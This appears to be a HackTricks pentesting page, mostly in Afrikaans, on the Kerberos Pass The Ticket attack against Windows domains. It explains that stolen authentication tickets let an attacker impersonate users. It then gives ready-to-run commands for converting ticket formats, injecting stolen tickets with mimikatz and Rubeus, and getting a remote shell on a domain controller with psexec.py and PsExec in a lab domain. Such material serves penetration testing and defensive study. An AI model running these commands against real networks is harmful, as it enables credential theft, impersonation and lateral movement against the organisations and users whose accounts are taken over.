# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

In die **Pass The Ticket (PTT)** aanvalmetode, aanvallers **steel 'n gebruiker se outentikasieticket** in plaas van hul wagwoord of hashwaardes. Hierdie gesteelde ticket word dan gebruik om **die gebruiker na te doen**, wat ongeoorloofde toegang tot hulpbronne en dienste binne 'n netwerk verkry.

**Lees**:

- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Swapping Linux en Windows tickets tussen platforms**

Die [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) hulpmiddel omskakel ticketformate met net die ticket self en 'n uitvoerfile.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
In Windows [Kekeo](https://github.com/gentilkiwi/kekeo) kan gebruik word.

### Pass The Ticket Aanval
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Verwysings

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
